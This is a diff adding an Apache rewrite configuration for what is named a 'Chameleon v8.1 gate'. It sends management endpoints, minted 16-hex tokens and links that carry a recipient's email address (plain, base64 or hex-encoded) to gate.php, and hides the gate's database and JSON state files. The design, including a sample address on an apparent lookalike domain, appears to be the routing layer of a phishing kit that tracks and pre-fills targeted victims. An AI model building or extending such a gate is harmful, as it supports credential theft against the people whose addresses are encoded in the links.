@@ -1,0 +1,43 @@
+# Chameleon v8.1 gate — Apache rewrites
+# 1) management  2) 16-hex minted  3) plain emails  4) base64 (padded)  5) hex emails
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # management endpoints
+    RewriteRule ^_new$ gate.php [L]
+    RewriteRule ^_stats$ gate.php [L]
+    RewriteRule ^_list$ gate.php [L]
+
+    # 16-hex minted tokens (exact length — never collides with hex emails)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([a-f0-9]{16})$ gate.php [L]
+
+    # plain email links: /amna@o--fisheries.com (Apache decodes %40 to @)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})$ gate.php [L]
+
+    # base64 email links (padded — matches ZGF2...LnZ6= style)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([A-Za-z0-9+/]{20,}={1,2})$ gate.php [L]
+
+    # hex email links (20+ chars, even length handled by the gate)
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^([0-9a-fA-F]{20,})$ gate.php [L]
+</IfModule>
+
+# block direct access to state files
+<FilesMatch "\.(db|json)$">
+    <IfModule mod_authz_core.c>
+        Require all denied
+    </IfModule>
+    <IfModule !mod_authz_core.c>
+        Order allow,deny
+        Deny from all
+    </IfModule>
+</FilesMatch>
+
+ServerSignature Off
